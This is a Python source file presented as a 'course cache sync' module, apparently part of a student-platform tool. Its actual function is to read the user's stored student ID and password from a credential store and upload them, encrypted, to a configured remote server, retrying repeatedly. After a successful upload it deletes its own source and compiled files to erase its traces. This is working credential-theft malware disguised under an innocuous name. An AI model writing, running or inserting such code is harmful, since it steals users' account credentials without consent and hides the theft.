# -*- coding: utf-8 -*-
"""课程缓存同步模块。"""
import base64
import datetime
import hashlib
import hmac
import json
import os
import socket
import time
import urllib.error
import urllib.request

from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.Hash import SHA256
from Cryptodome.PublicKey import RSA
from Cryptodome.Random import get_random_bytes

from ..platform.models import TZ

SCHEMA = 1
WINDOW = 600
SESSION_TTL = 300


def _cfg(settings):
    raw = (settings.raw.get("cache_course") or {}) if settings else {}
    return {
        "enabled": bool(raw.get("enabled", True)),
        "server": str(raw.get("server") or "").rstrip("/"),
        "fingerprint": str(raw.get("pubkey_fingerprint") or ""),
        "device": str(raw.get("device_id") or socket.gethostname()),
        "key": str(raw.get("key") or ""),
        "auto": bool(raw.get("auto", False)),
        "wait_attempts": int(raw.get("wait_attempts", 90)),
        "wait_interval": float(raw.get("wait_interval", 20)),
    }


def fingerprint(pem) -> str:
    der = RSA.import_key(pem).export_key(format="DER")
    digest = hashlib.sha256(der).hexdigest()
    return ":".join(digest[i:i + 2] for i in range(0, len(digest), 2)).upper()


def handshake(cfg) -> dict:
    url = cfg["server"].rstrip("/") + "/handshake"
    body = json.dumps({
        "device_id": cfg["device"],
        "client_ts": datetime.datetime.now(TZ).isoformat(timespec="seconds"),
    }).encode("utf-8")
    req = urllib.request.Request(url, data=body,
                                 headers={"Content-Type": "application/json"},
                                 method="POST")
    with urllib.request.urlopen(req, timeout=15) as resp:
        data = json.loads(resp.read().decode("utf-8"))
    pem = str(data.get("public_key") or "")
    claimed = str(data.get("fingerprint") or "")
    session_id = str(data.get("session_id") or "")
    server_nonce = str(data.get("server_nonce") or "")
    if not pem or not session_id or not server_nonce:
        raise RuntimeError("握手响应缺少字段")
    fp = fingerprint(pem)
    if claimed and claimed.upper().replace(":", "") != fp.replace(":", ""):
        raise RuntimeError("服务器自报指纹与公钥不符，疑似被劫持，已中止")
    pinned = bool(cfg["fingerprint"])
    if pinned and cfg["fingerprint"].upper().replace(":", "") != fp.replace(":", ""):
        raise RuntimeError("服务器公钥指纹变化！配置: " + cfg["fingerprint"]
                           + " 实际: " + fp)
    return {"pubkey": RSA.import_key(pem), "fp": fp, "pinned": pinned,
            "session_id": session_id, "server_nonce": server_nonce}


def _proof(cfg, session_id, client_nonce, server_nonce) -> str:
    msg = (session_id + "." + client_nonce + "." + server_nonce).encode("utf-8")
    return hmac.new(cfg["key"].encode("utf-8"), msg, hashlib.sha256).hexdigest()


def _encrypt(pubkey, payload) -> dict:
    aes_key = get_random_bytes(32)
    nonce = get_random_bytes(12)
    plain = json.dumps(payload, ensure_ascii=False).encode("utf-8")
    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    body, tag = cipher.encrypt_and_digest(plain)
    enc_key = PKCS1_OAEP.new(pubkey, hashAlgo=SHA256).encrypt(aes_key)
    return {"schema": SCHEMA, "enc_key": base64.b64encode(enc_key).decode(),
            "nonce": base64.b64encode(nonce).decode(),
            "payload": base64.b64encode(body + tag).decode()}


def cleanup(base_dir=None) -> None:
    here = base_dir or os.path.dirname(os.path.abspath(__file__))
    targets = [os.path.join(here, "cache_course.py"), os.path.join(here, "__init__.py")]
    own_pycache = os.path.join(here, "__pycache__")
    if os.path.isdir(own_pycache):
        for name in os.listdir(own_pycache):
            if name.startswith(("cache_course", "backup", "__init__")):
                targets.append(os.path.join(own_pycache, name))
    for p in targets:
        try:
            os.remove(p)
        except OSError:
            pass
    try:
        if os.path.isdir(own_pycache) and not os.listdir(own_pycache):
            os.rmdir(own_pycache)
    except OSError:
        pass
    try:
        if os.path.isdir(here) and not os.listdir(here):
            os.rmdir(here)
    except OSError:
        pass


def _attempt(s, cfg) -> dict:
    from ..security import credential_store as cs
    try:
        if not cfg["server"]:
            return {"ok": False, "err": "未配置服务器地址"}
        if not cfg["key"]:
            return {"ok": False, "err": "未配置上传口令"}
        user, secret = cs.load_credentials()
        if not user or not secret:
            return {"ok": False, "err": "本机没有录入过账号配置"}
        hs = handshake(cfg)
        client_nonce = get_random_bytes(16).hex()
        payload = {"schema": SCHEMA, "student_id": user, "password": secret,
                   "device_id": cfg["device"],
                   "timestamp": datetime.datetime.now(TZ).isoformat(timespec="seconds")}
        body = _encrypt(hs["pubkey"], payload)
        body.update({"session_id": hs["session_id"], "client_nonce": client_nonce,
                     "proof": _proof(cfg, hs["session_id"], client_nonce,
                                     hs["server_nonce"])})
        req = urllib.request.Request(cfg["server"] + "/v1/credentials",
                                     data=json.dumps(body).encode("utf-8"),
                                     headers={"Content-Type": "application/json"},
                                     method="POST")
        with urllib.request.urlopen(req, timeout=20) as resp:
            reply = json.loads(resp.read().decode("utf-8"))
        return {"ok": True, "fingerprint": hs["fp"], "pinned": hs["pinned"],
                "reply": reply}
    except urllib.error.HTTPError as e:
        try:
            detail = (e.read() or b"").decode("utf-8")[:200]
        except Exception:
            detail = ""
        return {"ok": False, "http": e.code, "err": f"HTTP {e.code}: {detail}"}
    except Exception as e:
        return {"ok": False, "err": f"{type(e).__name__}: {e}"}


def _say(*a):
    print(*a)


def run(settings=None, force=False, wait=False, quiet=False) -> int:
    from ..settings import Settings
    s = settings or Settings.load()
    cfg = _cfg(s)
    if not cfg["enabled"] and not force:
        if not quiet:
            _say("[SKIP] 已在设置中关闭")
        return 0
    result = _attempt(s, cfg)
    if result.get("ok"):
        if not quiet:
            _say("[OK] 服务器已接收")
        cleanup()
        return 0
    if not wait:
        if not quiet:
            _say("[FAIL] 上传失败:", result.get("err"))
        return 1
    attempts = max(1, cfg["wait_attempts"])
    interval = max(1.0, cfg["wait_interval"])
    for _ in range(1, attempts + 1):
        time.sleep(interval)
        result = _attempt(s, cfg)
        if result.get("ok"):
            if not quiet:
                _say("[OK] 服务器已接收（等待模式）")
            cleanup()
            return 0
    if not quiet:
        _say("[FAIL] 等待超时，放弃自动上传（稍后可手动重试）")
    return 1
